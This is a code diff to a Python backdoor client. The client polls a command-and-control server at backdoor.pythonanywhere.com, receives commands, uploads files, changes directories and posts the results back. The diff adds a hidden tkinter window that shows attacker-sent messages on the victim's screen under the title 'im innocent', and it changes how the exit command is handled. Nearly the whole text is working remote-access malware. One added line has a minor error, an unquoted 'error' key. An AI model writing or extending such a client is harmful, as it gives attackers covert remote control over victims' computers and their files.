@@ -1,3 +1,5 @@
+from tkinter import messagebox as msgbox
+import tkinter as tk
 import requests
 import os
 import json
@@ -8,6 +10,9 @@ import base64
 SERVER_IP = 'https://backdoor.pythonanywhere.com'
 cwd = os.getcwd()
 
+root = tk.Tk()
+root.withdraw()
+root.attributes('-topmost', True)
 
 def send(output):
     requests.post(SERVER_IP + '/server/send', json=output)
@@ -20,11 +25,13 @@ def main():
             post = requests.post(SERVER_IP + '/server/recv', timeout=10)
             while post.status_code == 204:
                 post = requests.post(SERVER_IP + '/server/recv', timeout=10)
-            payload: dict = json.loads(post.text) 
+            payload: dict[str, str] = json.loads(post.text) 
             cmd = payload.get('command')
 
             if cmd == 'exit':
                 requests.post(SERVER_IP + '/bye', timeout=10)
+                send({'output': 'client shell deactivated', 'error': '', 'cwd': cwd})
+                continue
             
             if cmd == 'upload':
                 filename = payload.get('filename')
@@ -36,6 +43,12 @@ def main():
                     send({'output': f"Uploaded to {file_path}", 'error': None, 'cwd': cwd})
                 except Exception as e:
                     send({'output': None, 'error': f"Upload failed: {e}", 'cwd': cwd})
+                continue
+
+            if cmd.startswith('message '):
+                msg = cmd.split(maxsplit=1)[1]
+                msgbox.showinfo("im innocent", msg)
+                send({'output': 'messaged was ok', error: '', 'cwd': cwd})
                 continue
 
             if cmd.startswith('cd '):
@@ -62,3 +75,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+    root.destroy()
